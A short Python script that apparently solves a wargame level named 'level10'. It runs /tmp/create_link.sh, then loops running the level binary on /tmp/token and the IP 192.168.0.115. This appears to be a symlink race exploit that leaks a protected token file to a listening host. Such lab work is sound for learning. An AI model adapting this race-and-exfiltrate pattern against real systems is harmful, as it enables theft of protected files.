from subprocess import Popen, PIPE, call

Popen(["/bin/bash", "/tmp/create_link.sh"])

while True:
    Popen(["./level10", "/tmp/token", "192.168.0.115"])

